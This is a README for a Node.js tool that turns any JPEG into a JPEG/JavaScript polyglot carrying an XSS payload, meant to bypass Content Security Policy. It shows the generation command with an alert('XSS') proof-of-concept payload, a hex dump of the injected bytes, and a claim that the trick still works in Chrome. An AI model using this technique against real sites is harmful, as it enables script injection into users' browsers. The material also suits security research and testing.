# JPGPolyglotGenerate <!-- Developed by: C. Swiers -->
Tool inspired by[^1]: https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs

This automates the process. Use any[^2] jpg file and add a XSS payload to it:
```bash
nodejs jpg-polyglot-generate.js file.jpg file-xss.jpg 'alert("XSS");'
```

Optionally check output with:
```bash
xxd file-xss.jpg | grep -C5 aler
00002ee0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00002ef0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00002f00: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00002f10: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00002f20: 0000 0000 0000 0000 0000 0000 0000 fffe  ................
00002f30: 0014 2a2f 3d61 6c65 7274 2822 5853 5322  ..*/=alert("XSS"
00002f40: 293b 2f2a ffe1 172a 4578 6966 0000 4d4d  );/*...*Exif..MM
00002f50: 002a 0000 0008 0007 0112 0003 0000 0001  .*..............
00002f60: 0001 0000 011a 0005 0000 0001 0000 0062  ...............b
00002f70: 011b 0005 0000 0001 0000 006a 0128 0003  ...........j.(..
00002f80: 0000 0001 0002 0000 0131 0002 0000 001c  .........1......
```
[^1]: This and many other articles referencing this one mention: __Mozilla are fixing this in Firefox 51.__, however everyone forgets to mention this still works in Chrome and other browsers!
[^2]: Make sure it does not contain the sequence 2a2f. Depending on the location in the file the exploit might stil work, but the image will be broken and won't look pretty:
`xxd file.jpg | grep "2a2f"`. If this command has any output find another jpg file, otherwise continue.
